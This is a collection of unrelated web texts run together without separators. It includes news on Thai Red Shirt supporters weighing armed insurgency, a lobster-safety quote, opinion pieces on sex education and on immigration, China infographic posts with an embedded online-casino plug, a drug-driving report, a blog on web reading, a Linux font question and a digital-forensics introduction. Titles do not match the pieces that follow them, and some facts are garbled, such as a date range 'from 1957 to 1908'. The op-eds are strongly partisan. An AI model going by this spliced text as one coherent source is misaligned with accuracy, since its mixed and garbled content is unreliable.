Sitting next to his father , Thongchai , on leave from service , said : “ It was just terrible to face off with people who might be my friends , neighbours or relatives .
We were told to disperse protesters , but I never expected such deadly consequence . ”
He said he rarely discussed the events of the bloody day with his father .
“ I will join Red Shirt protests if there is another round after I discharge from military service .
My friend became a Red Shirt guard after leaving the army . ”
Isan , the revived Red Zone , is expected to be a centre for what happens next .
Red Shirts feel a mix of extreme anger , confusion , hope and despair while discussing the next steps .
Wearing red shirts at the Sunday markets is one idea , as is refusing to sell anything to soldiers .
Some people , such as 51 - year - old teacher Panee Tamma from Khon Ken province , await elections — but , at the same time , doubt the prospects of a vote being free and fair .
Some observers cautiously predict an armed insurgency .
The ICG has warned civil war could break out if a political resolution is not found .
Dr Paul Chambers , a long - time observer of Thai politics and military affairs from the Politics Institute of Heidelberg University , said : “ There could be a low - intensity undeclared civil war .
This could happen as Red Shirts in the countryside rise up , following the crackdown on the Red Shirts at Ratchaprasong .
“ Thaksin might even create a government in exile . ”
One Red Shirts supporter in Khon Ken province , who does n’t wish to be named , said : “ There are many people here who would join an underground movement or even armed insurgency if somebody would initiate it . ”
Another supporter in Mukdahan pondered the question of armed insurgency .
She said .
“ I ’m not sure if it could be similar to the communist insurgency era .
But yes , I could provide food and shelter for them . ”
No matter what type of movement appears , Red Shirts in rural provinces look forward to the next moves in continuing their struggle for democracy .

Are lobster safe to eat we asked a fisherman who said " anatomically if the thorax , tail , flipper , crusher claw , pincher claw , legs and antennae are all in the proper place and lobster is alive and well then it 's safe to eat . "
" Live lobsters are perishable , and require a controlled salt water environment to remain alive .
If the lobster is not alive , he emphasized , then do n't eat it , " said the fisherman .
" They do not generally live much more than a day out of water , so you should cook your lobsters on the day you receive them or refrigerate them between moist towels until your water is boiling , the butter is melted and your ready to twist off the claws and eat them . "

the quixotic battle of abstinence only zealots
California declined federal funds to teach abstinence - only sex ed .
The result ?
Teen pregnancies are down to their lowest level ever .
When the federal government was distributing funds for sex education with the catch that all sex ed programs backed by all that cash be abstinence - only , the state of California passed .
Instead , its schools taught a much more comprehensive curriculum about human sexuality and gave teenagers access to contraception from a number of family planning services .
The result ?
Teen pregnancy rates in the state are at their lowest ever as they ’re rising across the nation , with the most abstinence zealous states tending to rack up the highest rates ; New Mexico is leading the nation in teen births along with much of the South .
Simply put , the numbers show that comprehensive sexual education works , abstinence - only dogma fails miserably in its mission , and those who still insist we stick with passing off scaremongering as legitimate education are demonstrably wrong .
People who tend to call themselves social conservatives are a puzzling movement .
On the one hand , when it comes to business , personal finance , healthcare , and gun ownership , they ’re all about individual rights with a heavy emphasis on taking responsibility for one ’s actions .
But when it comes to sex and religion , they have no faith in the very same people who they just trusted with just about everything else under the sun .
In their view , sex should only happen for one reason and one reason only : reproduction .
And so they stand in front of teens surging with hormones and feelings that are alien but oddly alluring to them , and tell them not to give in to the urges that have been ravaging teenage bodies for tens of thousands of years in our species alone .
Then , just as it inevitably fails , they switch to scaremongering and forcing teens to choose against having sex by turning simple things like finding help , access to family planning , and buying birth control either difficult or taboo .
Just to make it worse , abstinence only classes often lie about the efficiency of contraceptives , making it less likely that teenagers will use them , and actually raise the incidence of STDs and pregnancies .
Simply put , abstinence - only crusaders are a public health hazard right up there with anti-vaccination groups which refuse to immunize their kids despite having no grounds for their phobias .
Oh sure , both groups will dispute this statement and both will summon a self - serving study of some sort to back up their stances , and in both cases , they ’ll be wrong .
While the anti-vaxers have a stable of quack doctors , not to mention a greedy fraud with a martyr complex , from which to draw their pseudoscience , the abstinence - only crowd has think tanks armed with fraudulent studies and outrageous , distorted and outright fabricated anecdotes .
But again , when a state decides to teach teenagers about the reality of sex and makes all the necessary education and services accessible to more young adults , there is a very marked decrease in teen pregnancies .
Actually , the current reversal in previously declining teen pregnancy rates happened in 2006 as the Bush administration ’s round of federal funds for abstinence - only education made its way throughout the nation .
Yes , it ’s true that during the Clinton era there was also a big round of investment in abstinence - only curricula and teen pregnancies still fell .
However the Bush round of funds invested far more aggressively in atrocious programs which were often administered by religious organizations and required zero scientific content .
As a result , we ’ve seen more and more aggressive abstinence - only programs with an obvious religious and dogmatic overtone , feeding less and less legitimate scientific content to the students that really need it .
This is n’t so much a partisan issue as it is a failure to get facts into the classroom on both sides of the aisle .
Keep in mind , Clinton fired Surgeon General Joycelyn Elders for saying that masturbation was normal and healthy , and maybe someone ought to consider covering it in sex ed classes .
Only with Obama has there been some indication of change towards sex ed programs on the national level , but that indication is still stuck between a campaign speech remark and an actual bill to fund comprehensive sexual education .
There ’s only a cut to the current stable of abstinence - only programs , something that does n’t do much to reverse the situation .
So if abstinence programs are getting worse and worse , why are comprehensive programs better ?
Well , first is the fact that they actually explain safe sex practices and encourage teens to use contraception .
This means that when teens have sex , they ’re far less likely to get an STD or get pregnant .
On top of that , a comprehensive class explains the financial and academic reasons to delay sex .
The point is to tell teenagers that sex should not be the most important thing in their lives and they have other , much more pressing matters to which they need to attend .
But if they do decide to have sex , they better choose their partners wisely and use protection to mitigate the risks .
Rather than promote rampant teen sexuality , as abstinence - only dogmatists accuse these programs of doing , a good comprehensive sex ed curriculum does three things : delays when teenagers start having sex , educates teens on proper contraception , and gives them a complete picture of human sexuality as a healthy part of adult life rather than some dangerous and forbidden fruit magically made safe and wonderful by a wedding ring .
While crazed abstinence - only activists threaten to sue teachers for saying that sex is just a normal human desire , all they ’re doing is showing their irrationality on the subject .
And unfortunately , far too many of our politicians are eager to bend over and help their harmful and irresponsible crusade .
Showing the Amazing Changes in China Via Infographics
Chinfographics.com created beautiful infographics to show the extensive and amazing changes as well as the emerging needs of the Chinese marketplace .
The goal of Marten Strassburg and David Wang was to create stunning infographics based on data from China .
They certainly succeeded as you can see from the images below .
I happen to enjoy playing at online casinos US player friendly sites .
I wonder if there is an emerging online gambling market in China .
In 2006 the US government passed the UIGEA ( Unlawful Internet Gambling Enforcement Act ) laws that limited options for US online casino players .
Not only did a number of gambling platform software companies decided to not accept US players , but the Department of Justice also decided to go after the companies ( banks and credit card companies ) that processed monies to casinos for US players .
The impact caused by the banks ' reluctance to allow wide usage of credit cards was felt by both land and internet casino sites .
Originally , most of the alternatives to fund gaming accounts required sending personal checks , or make bank transfers , or ACH withdrawals .
However as the years have past , the banks and credit card companies started allowing their cards to be used for online gambling deposits .
Friends no longer ask why I apperar to prefer playing at online casinos since they now recognize how convenient it is .
Once I compared online casinos to land based casinos by using the analogy of comparing a Novelty Nuptse North Face puffer jacket to a Thermoball North Face puffer jacket .
Both jackets are made using the innovative high technology that North Face is known for .
Both types of jackets fulfil their function , but one ( Novelty Nuptse ) is very puffy and ofers a larger , fuller silhouette that to me seems rather retro while the other ( the Thermoball ) provides a sleeker , fashion forward look .
By this time my friends ' eyes were beginning too glaze over .
Come on I said , standard land based casinos are more like the very puffy Novelty Nuptse jacket while online casinos are more forward and advance like the Thermoball .
Nope , zip , the analogy did n't connect .
Oh well .
It will be interesting to see what happens in China .
I would have loved to see what Marten Strassburg and David Wang would do with Chinese online casino gambling data .
However , sometime after 2010 when this website first appeared on the web , their domain expired and chinfographics disappeared .
When I saw that the domain was available I bought it with the goal of recreating as much content as possible from their archived pages .
I did end up going to outside sources to find their bold graphic images .
I was a big fan of what they were attempting to do and did n't want their site to just disappear permanently .
Enjoy .

The Long Tail – 60 Chinese Cities with a Population of Over 1 Million
There are as many as 60 cities in China with more than 1 Million people .
For purpose of giving viewers an impression of Chinese city sizes , the graph depicts 60 Chinese cities of which the urban area population is larger than 1 million .
From the bottom to the top , they are listed in an order by their sizes .
The smallest is Qiqihar , Northeast China , with 1.04 million , and Shanghai , the largest in China , boasts 14.24 million .
We have compared city population data in China and the world using data from demographia.com .
We also adopt its definition of urban area population which means :
“ a continuously built up landmass of urban development ” , or “ the lighted area that can be observed from an airplane at night ” .
As a result , if you find a man from Chongqing , where 31 million is claimed living , mad at the city ’s downsized population , please do n’t be upset !
The 31 million people are living all over the municipal area where most part is rural .
Therefore , the major part of the figure cannot be counted as the city population even though the concept of urban area population is not adopted .
We also list some world famous cities alongside their Chinese counterparts in the graph where the Chinese data are mainly made for 2007 and the world ones for 2009 estimation .

China ’s Auto Demand 1980 - 2020
The demand will be respectively 140 million in 2015 and 217 million in 2020 .
Chinese love cars .
They started to know western life on wheels by watching American movies .
Since 1980 when China ’s Opening and Reform adventure debuted , the auto number in the country has been growing constantly , from 1.78 million , 1980 to 64 million , 2009 .
It seems a great leap regarding the number .
But China ’s auto appetite is ever insatiable .
Anyhow its auto number per 1000 people is currently way too small compared with U.S. ( 800 ) and other developed countries ( 500 on average ) .
Analysts suggest that China ’s GDP will be able to overtake U.S. in early 2020s .
Although the forecast is somewhat over - optimistic , the impact of China ’s GDP expansion is far - reaching .
In the realm of auto market , the truth is that China has become world ’s largest auto consumer .
When a country reaches some level of affluence , auto number will increase drastically .
China has already come into the stage .
What will happen in the next decade ?
As shown by the graphics , Chinfographics.com makes a projection on how many autos China will have , based on the assumption that the country ’s auto number per 1000 people will reach 100 in 2015 and 150 in 2020 .

Personally - Owned Cars in China 2002 -2009
Personally - owned cars in China grew from 3.43 M to 26.05 M in 2002-2009
In the first infographic of our auto series , we envisioned China ’s auto demand in the next decade on the basis of auto number per 1000 people and GDP growth .
It has been admitted that when people get rich , they will actualize their dreams to own cars .
Our projection was not only built on theoretical hypothesis , but more importantly on what has happened in the market .
The second graph demonstrates the personally - owned car growth in Beijing and China as a whole from 2002 to 2009 .
It proves again how much Chinese are fond of cars .
In 2002 , 3.43 million cars were possessed personally , while the number reached 26.05 million 7 years later .
In the country ’s capital , Beijingers had 0.803 million cars in 2004 and 2.181 million in 2009 .
Even though cars procured by organizations such as government , companies and associations still has a big share of the Chinese market , cars paid for by individuals have become important for the domestic consumption .
International car - makers value the market very high , especially when Europeans and Americans hold tightly to their purses during the financial crisis .

33 % of Chinese Drivers in 2009 Got Their License in the Past 3 Years
33 % of drivers in China got their license in the past three years according to our data
Driving an auto used to be a highly - respected skill in China .
If someone had a driving license in 1980s or even 1990s , he or she would have a quite high social status in China .
There were cases in which elites at present China served as a driver during the period .
( See Mr. Ma Mingzhe ’s background , Chairman of the Board , Shenzhen Ping’an Insurance )
Do n’t be surprised at their achievements .
Check the availability of drivers in the world ’s largest populated country in 1978 – a little pool of 1.93 million when China ’s total population was 963 million .
Only some lucky guys at that time had got the chance to steer the wheel .
But , do n’t follow Mr Ma ’s footprint neither .
Time has changed fundamentally .
China had 138.87 million drivers already in 2009 , 72.2 times of that in 1978 .
In other words , there would be on average one ( 1 ) licensed driver among ten ( 10 ) Chinese in the last year .
It is a totally different situation for a man trying to make his fortune from the driver profession .
Driver number growth accelerated during recent years .
49 % of total drivers in 2009 gained their license since 2005 and 33 % of them were licensed within the past 3 years .
Chinfographics.com would bet these new drivers learned to drive not for copying Mr Ma ’s roadmap , but for their fondness of driving and their swelling wallet as well .
In China , it would cost around RMB 3,500 to study driving in a school and take the driving exams .
After dozens of studying hours , students are eligible to be tested by officials .
Normally , the whole process would last 1 - 3 months .
Chinese roads are not as dangerous as one may wonder on the basis of so many new drivers .
It still needs some time before all the new purchasing power is released since some of them just learned the skill and have not had a car yet .
At least , no driver wants to crash their vehicles .
Besides , Chinese government keeps strengthening the implementation of driving regulations .
In Beijing , drivers who are caught driving and failing the passage of alchohol test will be taken into custody as long as 10 days .
If you want to know other phenomena of the sanguine Chinese auto market , see our related auto infographics , China ’s auto demand in the next decade and China ’s personally - owned car expansion .

China ’s Football Position and History in World Cup
There is only one important game left in this year ’s world cup !
We think the best teams won the semi-finals although Germany probably has been best throughout the tournament showing the world how youngsters can form a strong and fun team .
While we wait for the final to take place , we want to show you China ’s world Cup history :
Will China with 1.3B people ever produce 20 good football players ?
For Chinese , there is nothing more depressing than football among their national perfomances and nothing more tantalizing in sports than entering the World Cup .
They often wonder why a country with 1.3 billion people cannot produce 11 great talents to play for glory .
China ’s main combatants / neighbors , Japan and South Korea represent the highest level of Asian football .
They jointly held World Cup 2002 and made historical achievements : Japan came into the round of 16 and South Korea unprecedentedly stood at the field of the semi-final .
North Koreans , distressed Chinese fans even more by qualifying for South Africa World Cup 2010 .
And they ’d already demonstrated their football aspiration before by beating Italy in WC 1966 in England .
With special gratitude to Parka ’s artwork , we made an infographic to show China ’s World Cup position among present members of the Asian Football Confederation ( AFC ) .
China is at the bottom with one qualification for the World Cup , while Iraq , Kuwait , United Arab Emirates , Indonesia , North Korea , Iran , Australia , Japan , Saudi Arabia , South Korea qualified 1 , 1 , 1 , 1 , 2 , 3 , 3 , 4 , 4 and 8 times respectively .
In relation to this we visualize the bumpy history of Chinese efforts to qualify to World Cup by presenting the key games from 1957 to 1908 .
The explanation text at the bottom shortly describes those woeful events branded on every Chinese fan ’s memory .
Out of nine rounds , China only qualified once to the World Cup 2002 by beating Oman on Oct. 7th , 2001 in Shenyang , China .
However , they did that when their strongest competitors were already automatically qualified to their own World Cup ( Japan and South Korea ) .
As a matter of fact , that one journey to play the World Cup also ended up with humiliation – they lost all the 3 games , making no goal and collecting no points .
The failure of Chinese football has complex roots , ranging from macro-system to micro-arrangements .
The sports system is often blamed as only cultivating a handful of selected players since they were kids .
As a result , many talents out of the pool cannot have the chance to get the resources to develop themselves .

Bejing Real Estate – A Hot Market .
Infographic That Shows It From Different Perspectives
How hot or crazy have the real estate prices in Beijing been ?
Chinfographics.com show below a few graphs with the development at present and in the past from different perspectives .
Beijing Housing Prices & Locations
“ Beijing Housing Prices & Locations ” presents prices of “ Forward Delivery Housing ” or “ Future - delivered Residential Buildings ” within different Ring Roads in Beijing during the period from January to April , 2010 .
The ugly - apprehensible Chinese terminologies can be explained as those residential buildings that have not been completed but purchasers will be given the access to them in certain length of time as contract states .
The left column of circles identifies the ballooning prices measured by RMB / Square Meters in various Beijing locations ( Notes : RMB is exchanged at around 6.8:1 against USD recently ) .
The prices in locations outside the 6th Ring Road of Beijing is at the bottom of the column while those in locations inside the 4th Ring Road is at the top .
Other locations are also shown between the two circles .
In the mean time , a general idea of how large those areas enclosed by the Ring Roads are can be conveyed by the layers of circles of “ Beijing Approximate Radius Comparison ” at the right side of the graph .
Number of Years for a Couple of Beijing Lovers to Buy a 100 SQM Apartment
Buying an apartment is a big problem for young Beijing lovers who want to get into marriage .
In the traditional chinese culture , owning an place to live is a crucial precondition to start a family .
As a typical case , the young man ’s marrige proposal will be turned down by his future mother - in - law if he has not bought a living place yet .
Let ’s see how many years the lovers will need to own a 100 square meter apartment through our second sub - graph if they invest their money only on the apartment without any other consumption , such as food , clothes , entertainment , travel and education .
Based on the prices above and the data of average disposable income , which is RMB 60 414 for a couple of average urban residents , provided by Beijing Municipal Bureau of Statistics , we learn that the lovers will respectively need 56.5 , 35.9 , 23.6 and 19.8 years to afford a home in a location inside the 4th Ringroad , between the 4th and 5th , between the 5th and 6th , and outside the 6th Ringroad .
Beijing Commodity Building Prices in 2003 - 2010
“ Commodity Building ” , another Chinese real estate jargon , means buildings with residential or commercial purposes , which are developed by companies and approved by the government .
Our infographic follows the price development in Beijing since 2003 of which it is represented by the inner circle .
As years grow , their circles expand outward .
As shown by the circle expansion , the price this year is 462 % of that in 2003 .
And 2004 marked the smallest increase against the previous year , rising only by 6.7 % , while 2005 made revenge with the largest leap of 49.3 % against 2004 .
The present world financial crisis also cast shadow on Chinese market , as evidenced by a 9.5 % conservative increase of Beijing commodity building price in 2008 .
But , after the Chinese government pledged to stabilize its GDP growth and poured huge liquidity into the market , the real estate beast was unleashed again in 2009 and 2010 , with a 23 % and 30.7 % jump respectively .

So I Met God The Other Day
RATING 0 /5 from ratings fromratings show all ratings
Over 2,000 people have been caught driving while under the influence of drugs , since the introduction of random drug testing in Victoria .
Victoria was the first place in the world to introduce random testing five - and - a - half years ago .
Since then , over 120,000 drivers have been tested and 2,000 people have been caught driving under the influence of drugs .
That is a rate of 1 in every 61 drivers .
Eighty - three per cent of those caught had been taking speed .
Cannabis and ecstasy were also detected .
Victoria Police have caught more than 300 people driving under the influence of drugs in the past six months alone .
Figures show 87 per cent of those caught are male and over one - third are under 26 - years - old .
Inspector Martin Boorman says he believes people are not fully aware of the danger caused by drug drivers .
" I think most of the community understand that drink driving is dangerous .
People have to understand that drugs driving is dangerous and people get hurt , " he said .
" With drugs and driving , people do n't look like they 're falling down drunk or anything like that .
The signs and effects can be quite subtle . "
In my last post , I outlined what I loved about the web and specifically about blogging .
I spend hours a day online reading , writing and researching .
As a student , it ’s an indispensable and extremely convenient tool .
Rather than hunt down articles or books at the library , which may not even have them once I get there , much of the information that I need for research is available instantly online .
I love the fact , as I mentioned in that last post , that the web offers a far larger array of interesting material than do most other mediums , all of which I can access with ease and basically no cost whatsoever .
Essentially , I ’m probably not going to stop my surfing habits any time soon .
Some recent pieces by Nicholas Carr , however , have caused me to take pause and reflect on my relationship with the web , specifically how it has changed my habits and cognitive makeup – and yes , I found Carr ’s pieces on the web .
Specifically , it seems that my relationship with the web has significantly altered my relationship with my first love , books .
Anyone who knows me will know that I am and have always been an avid reader and lover of books .
As much time as I spend on the web , I do n’t see myself jettisoning the pleasure of the traditional printed book , even with the advent of the Kindle or iPad .
In high school , my reading was at its most voracious .
I would typically go through two books every week while fully absorbing and appreciating everything I read , never rushing through the finely crafted prose of Rushdie or without pausing to contemplate the ethics of A Clockwork Orange .
I got through so many books in so little time simply because I had the drive and willingness to devote my time to them .
Reading was n’t a hobby or something I did whenever I had a spare moment , but rather a part of my everyday routine , as important as having breakfast or doing laundry – reading truly felt like a necessity .
This has changed somewhat over the past few years .
Now , while I still consider books to be an integral part of my life , I find that I do less reading , though I still do read regularly .
However , while I went through two or three books a week in high school , I might now take a week and a half to two weeks to finish a novel .
Furthermore , I find that my memory is not quite as sharp as it once was when it comes to what I ’ve read .
For example , only a few years ago I could easily recall off the top of my head the last several books I had read and talk extensively about them , whereas it now takes a moment to remember the last book I read and the important details of it , most likely because I ’m not constantly reading as I once was .
I ’d like to think that I still read more than the average person and I can still retain information about what I ’ve read quite well , but somehow I do n’t feel it ’s as effortless as it once was .
My reading habits have changed drastically , of that there is no doubt .
Sitting down with a book for three hours straight is now impossible though it was once routine , and I will spend a bit more time with each page in order to absorb its contents fully .
This change of habit seems to directly correlate with my growing use of the web and the effect that it has had on my brain , and this is where Nicholas Carr comes into the picture .
Cognitive Overload
In a recent and incredibly thoughtful piece in Wired , Carr explores the effect that prolonged usage of the web has had on our brains , and the results are not particularly encouraging .
I ’m inclined to agree with Carr for the most part that the web has had something of a detrimental effect on our ability to process long - form information and store it for an extended period of time , especially because I myself took several attempts to get through Carr ’s piece , which I should have been able to complete in one sitting .
The crux of Carr ’s piece is the assertion that the internet often presents an overload for our capacity to absorb and interpret information for future use .
Carr employs an interesting metaphor to illustrate this , stating the following :
Imagine filling a bathtub with a thimble ; that ’s the challenge involved in moving information from working memory into long - term memory .
When we read a book , the information faucet provides a steady drip , which we can control by varying the pace of our reading .
Through our single - minded concentration on the text , we can transfer much of the information , thimbleful by thimbleful , into long - term memory and forge the rich associations essential to the creation of knowledge and wisdom .
On the Net , we face many information faucets , all going full blast .
Our little thimble overflows as we rush from tap to tap .
We transfer only a small jumble of drops from different faucets , not a continuous , coherent stream .
Psychologists refer to the information flowing into our working memory as our cognitive load .
When the load exceeds our mind ’s ability to process and store it , we ’re unable to retain the information or to draw connections with other memories .
We ca n’t translate the new material into conceptual knowledge .
Our ability to learn suffers , and our understanding remains weak .
That ’s why the extensive brain activity that Small discovered in Web searchers may be more a cause for concern than for celebration .
It points to cognitive overload .
Carr presents a scenario that any regular user of the web should easily relate to .
The fact is we are constantly distracted by the overload of stimuli found on any page and we tend to skim each piece of information as a result rather than address it in - depth .
True , we often skim books and magazines , but this has n’t always been our dominant mode of absorbing information , though it might become the case if the web comes monopolize our intake of information .
This propensity to skim content on the web rather than actually read it is perhaps what lies at the root of our inability to retain what we ’ve seen , and this can in turn impact our overall capacity to retain content and reflect upon it on a deeper level .
Carr does indeed assert that the habits we develop on the web can potentially make their way into our everyday lives .
He says ,
We know that the human brain is highly plastic ; neurons and synapses change as circumstances change .
When we adapt to a new cultural phenomenon , including the use of a new medium , we end up with a different brain , says Michael Merzenich , a pioneer of the field of neuroplasticity .
That means our online habits continue to reverberate in the workings of our brain cells even when we ’re not at a computer .
We ’re exercising the neural circuits devoted to skimming and multitasking while ignoring those used for reading and thinking deeply .
In this sense I agree with Carr .
Too much time on the web can have detrimental effects , but I do n’t think to solution is overly complicated , though it certainly might be easier said than done .
What Carr ’s argument boils to down to in my view is simply a reiteration of the old cliche that too much of anything is bad for you .
As readers and creatures who thrive on retaining and reemploying information , we need to discipline ourselves as readers and ensure that we maintain these vital faculties .
It ’s as simple as balancing your reading on the web , which allows you to skim and pick up quick facts , with actual deeper reading from a book that requires more reflection .
I do n’t doubt that deep reading can also be done on the web , though this too requires what in this day and age would probably be considered a Hurculean level of strength and discipline .
This entails slowly navigating through a piece and reading every word without clicking every single link that you encounter or constantly opening new tabs to shift your focus to other content .
It ’s difficult to keep focus to a computer monitor , so this might require reading a fragment of a piece , again without meandering off the page , and coming back to it after a break , which at least allows you to take in the information presented to you bit by bit without getting distracted by your email or Facebook .
Once again , I do n’t deny that this is difficult – I stopped writing that last sentence halfway through to check Facebook before returning to finish it – but I think it is worthwhile to cultivate these habits as reading off of the web becomes more prevalent in all our lives .
One of the things that I love about the web , namely all the information it contains , is precisely what underpins its ability to constantly distract us .
We wander constantly and in doing so we are n’t really reading or learning .
In his short response to Carr ’s piece , Andrew Sullivan also asserts that what we do on the web is not necessarily reading .
Sullivan asserts ,
Reading takes time , especially if you read slowly , as I do .
A real book takes longer to absorb .
You need to let a great book wander around your mind as you go along .
Online , there is no wandering .
The journey is so packed , the distances so great , it is more like watching the landscape from a train .
Many will certainly disagree that the web has this effect on us , but given my own personal experience with it and the effects it ’s had on my attention span , I ca n’t help but agree with Carr .
This is not to say that I ’ll disown the web , but only that I will make a more concerted effort to preserve other faculties which the web might dull .
Those Damn Links
The other recent piece from Carr that grabbed my attention was his examination of the role of the hyperlink in constantly distracting us while reading online .
Once again , this is something any regular internet user can relate to .
Carr states ,
Links are wonderful conveniences , as we all know ( from clicking on them compulsively day in and day out ) .
But they ’re also distractions .
Sometimes , they ’re big distractions – we click on a link , then another , then another , and pretty soon we ’ve forgotten what we ’d started out to do or to read .
Other times , they ’re tiny distractions , little textual gnats buzzing around your head .
Even if you do n’t click on a link , your eyes notice it , and your frontal cortex has to fire up a bunch of neurons to decide whether to click or not .
You may not notice the little extra cognitive load placed on your brain , but it ’s there and it matters .
People who read hypertext comprehend and learn less , studies show , than those who read the same material in printed form .
The more links in a piece of writing , the bigger the hit on comprehension .
Indeed , the link is one of the most novel tools the web offers .
The ability to instantly provide the reader with background information or another perspective on the topic at hand is not only convenient but potentially enriches the reading experience if we are able to use it responsibly .
Links often feed directly into our propensity to be distracted on the web and once again lead us back to the fact that we might not absorb all that we have read if we are constantly distracted .
Carr argues for not scattering links throughout a post or article , but leaving them at the end so readers can follow up on what they have read once they have finished the piece .
This would allow them to avoid the cognitive overload that Carr alludes to in the Wired article .
This debate over this , particularly Carr ’s exchanges with Jeff Jarvis , are especially interesting and can be seen on Carr ’s blog .
I ’m once again somewhat sympathetic to Carr ’s argument , but on the other hand have grown accustomed to the idea of having links placed in context , so I am rather torn over this .
I ’m often guilty of getting distracted by links and often feel that if I encounter a link midway through a piece that I absolutely have to click and read it before finishing the piece I was initially reading .
Then again , I feel like links scattered throughout a piece allows me as a reader to see exactly where the content being linked to is relevant .
I ’ve always placed links throughout my piece and will probably continue to do so , but Carr certainly has a valid point , and it is probably best left to the author ’s discretion how they wish to display links .
In the final analysis , links are always worthwhile and are excellent supplements to any piece of writing on the web , and it probably wo n’t matter a whole lot in the long where they ’re placed , but the question is worth considering in light of the issue of distraction and information retention online .
Dealing with links , wherever they are placed , probably comes back to the idea of disciplining ourselves as readers .
Somehow , we must find a way to get through a piece in its entirety and perhaps return to the links afterward for supplementary information .
This , again , is no easy task , and I have no answers as to how to go about it , but there is no doubt that the usefulness of the link has to be balanced against our need to actually read and think about the information which is presented to us .
Anyway , that ’s just my opinion , what the hell do I know ?
I am fully aware that this is the dumbest topic ever , so no need to remind me .
Anyway , I 'm not having any font issues other than with the look of disapproval smiley .
Eg. ಠ_ಠ ( I am not sure if it'll turn out right since I copied the incorrect rendering from my system ) .
It 's supposed to look like this http://lookofdisapproval.com/
or in font form in any of the posts from this guy :
http://www.reddit.com/user/look_of_disapproval/
It works on my Ubuntu system so there is obviously something I did n't do right in Arch and it 's bugging me .
I have checked my locale in rc.conf ( en_US.utf8 ) and in locale.gen ( en_US.UTF - 8 UTF - 8 and en_US ISO8859 - 1 ) and those seem ok as far as I can tell .
Thanks .

The Ottomans had an interesting method of assuring political stability .
The sprawling empire operated on a system in which " millets , " distinct ethnic and religious groups , were allowed to oversee their own internal affairs while giving absolute loyalty to the sultan and his government .
Every now and then a millet would be ordered to pack up and head out for a new home , at times at the opposite end of the imperium , amid new neighbors -- sometimes the original residents , sometimes other refugees -- of alien origins , ethnicity , and religious belief .
Christians among Muslims , Catholics among Orthodox , Bulgarians among Turks , Circassians among Arabs ... the variations were nearly endless .
In short order , the various groups would become so enmeshed in harassing and attacking each other that they could spare no time or energy to defy the status quo .
The Ottoman state acted as a referee , occasionally bouncing an ethnic group that got out of hand , but in general letting the circus roar along while they , the rulers , involved themselves in life 's finer things -- conspiracies against fellow officials or plans to conquer Western Europe .
From their point of view , it worked .
For nearly five hundred years , the Ottoman Empire remained a stable and ongoing concern .
Some aspects of the policy remain with us today , long after the empire vanished -- it explains much of the recent chaos in the ruins of Yugoslavia , for one thing .
So -- any questions about immigration ?
The American left has its own millet system , consisting of ethnic ( and other ) groups defined in large part by their grievances as victims of America .
The left provides these groups with attention , representation , and handouts in exchange for their votes .
This system has been in place for generations , and it has become the driving wheel of Democratic politics .
It has worked nearly as well for them as it did for the Ottoman overlords .
The history of the left in this country is a history of division .
Whatever conflict was current -- labor vs. management , class vs. class , race vs. race -- there you 'd find the left , stirring things up in order to derive as much political benefit as possible .
A workable democratic system demands a willingness to seek consensus and engage in compromise .
The left prefers Balkanization and permanent conflict .
For some years now , it has appeared that the Leftist formula had reached the end of its string .
The corrupt and crime - ridden unions were on their last legs , hemorrhaging members even as they drove jobs overseas .
Blacks were steadily moving into the middle class and becoming less susceptible to separatist rhetoric .
An attempt to transform the university student body into a permanent revolutionary phalanx on the Peronist model had only partial success -- students were willing to play while actually on campus , but after graduation , they went on to more interesting pursuits .
So how to keep the pot boiling ?
The answer was to go find a new millet -- or rather , to take advantage of the one next door , of the desperate people fleeing a serial kleptocracy , an uneducated , ignorant , and frightened mass open to all forms of manipulation .
This explains why illegal immigration is so important to the left .
It explains why efforts to halt illegal border - crossings , a problem that would n't challenge a six - year - old , are executed so halfheartedly and so often left unfinished ( see the recent " virtual fence " ) .
It explains the irrational response to Arizona 's effort to tighten up existing immigration law ( not create new law -- Arizona 's statute is no more than a reinforcement of existing federal law ) .
It explains the insistence that any solution to the immigration problem provide for amnesty and citizenship for the millions of illegals already living within our borders .
It has nothing to do with compassion , nothing to do with fairness or practicality or any of the other reasons offered by " reform " advocates .
As is almost always the case where the American left is involved , what it has to do with is power .
The left wishes to use the illegals as a battering ram against the American polity , the same as they used labor , and blacks , and every other group they ever encountered .
Illegals will become a new protected class , with privileges and entitlements denied the rest of the populace ( including , ironically , current members of previous such classes ) .
They will be discouraged from learning English , as occurs today under the doctrine of " bilingualism , " to assure that they remain a separate presence .
A vast bureaucracy will arise to " assist " the new citizenry , funded with billions -- oh hell , make that trillions , this is the Obama era -- and staffed with sociologists , ethnographers , psychologists , and other disciplines unimagined today .
All will be of the same political persuasion .
A permanent crisis atmosphere will be generated around the new class .
The " Amnestee " question will lead to endless problems and ramifications and act as a permanent indictment of the country and its policies .
The native population ( not to mention legal immigrants ) will grow increasingly embittered and angered .
The former illegals will be rendered even more miserable than they are today .
The solution is obvious .
There must be no amnesty .
Such an action would simply drop a permanent inassimilable presence in the midst of American society .
Current law must be executed to the fullest and , where necessary ( as in all the border states ) , reinforced with new state laws .
Illegals now in the country must be encouraged to regularize themselves according to recognized procedure .
They must not be allowed , for their sakes and ours , to become clients of the left - wing establishment .
The immigrant problem must be dealt with on a case - by - case basis , according to individual circumstances .
The notion that there is an acceptable mass solution is pure fantasy .
While this may involve some hardship -- and will certainly give rise to cries of " unfairness " -- it is in the long run the best solution for all concerned .
Even the illegals will be better off .
Becoming a member of a left - wing client class may not be the worst possible fate , but it 's not far from the bottom either , as generations of welfare families can attest .
American leftists did nothing for this country 's workers once the union vote - getting machines were established .
The same can be said of blacks in the inner cities once the political machines were in action there .
The goal of power is simply to perpetuate itself .
Actually solving problems might interfere with that process .
There is an air of permanence to the illegals problem .
We 're told we may as well accept the easiest solution , since it will always be with us .
But that 's not necessarily the case .
Mexico has a falling population .
In a few years , the country 's difficulty with providing employment to its masses is likely to solve itself .
( Those familiar with my attitude toward demographic predictions may wish to take this with a grain of salt . )
It 's possible that we 'll be paying bonuses for Mexican guest workers a generation from now .
Introduction to Time Zone Identification
In a digital forensic examination , establishing which Time Zone the system had been set to should one of the first examination tasks .
If this information is not established at an early stage and taken into account , the validity of Date / Time evidence may be brought into question .
Not only is this true for the examination of Browser History and related artefacts , it is also important when examining file system metadata .
I also believe this is something every examiner should be able to do manually , as opposed to relying on point and click or script forensics .
Whilst point and click certainly has a place and software tools can greatly increase the efficiency of the examination process , digital forensic practitioners need to possess the skills and ability to verify the results .
Some Date / Time values stored in binary files are affected by the Time Zone setting of the original suspect computer and many digital forensic applications can alter the representation of these dates by the Time Zone setting of the forensic workstation .
This becomes particularly complicated when the suspect computer was set to an incorrect Time Zone and the computer clock was set to correspond to the Local Time Zone .
